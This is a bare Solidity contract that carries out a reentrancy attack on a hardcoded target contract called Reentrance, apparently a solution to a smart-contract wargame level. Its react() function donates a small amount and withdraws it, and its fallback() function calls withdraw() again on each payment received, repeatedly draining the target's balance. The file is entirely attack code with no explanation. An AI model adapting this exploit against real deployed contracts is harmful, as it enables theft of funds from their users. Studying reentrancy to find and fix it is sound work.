interface Reentrance{
   function withdraw(uint256 _amount) external;
   function donate(address _add) external payable;
}

contract reentrance {
   Reentrance public calle;
  
  constructor() public payable {
    calle = Reentrance(0x173F5E9898771B7576b92fC42fB38D49145DAb37);
  }

  function react() external payable {
      calle.donate{value: 0.001 ether}(address(this));
      calle.withdraw(msg.value);
  }

  function withdraw() public {
     calle.withdraw(0.001 ether);
  }
  
  fallback() external payable {
      withdraw();
  }

}
